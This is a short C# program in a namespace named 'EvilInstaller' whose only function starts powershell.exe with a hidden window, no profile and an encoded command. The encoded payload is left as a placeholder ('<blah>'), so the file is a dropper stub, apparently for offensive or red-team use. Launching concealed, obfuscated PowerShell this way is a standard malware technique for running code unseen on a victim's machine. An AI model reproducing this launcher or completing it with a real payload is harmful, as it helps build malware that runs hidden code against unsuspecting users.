﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;


namespace EvilInstaller
{
    class Program
    {
        static void Main(string[] args)
        {
            var Shell_MSI = new ProcessStartInfo
            {
                FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                Arguments = @"-Sta -Nop -Window Hidden -EncodedCommand <blah>"
            };

            var proc = new Process
            {
                StartInfo = Shell_MSI
            };

            proc.Start();
            proc.WaitForExit();
            proc.Dispose();
        }
    }
}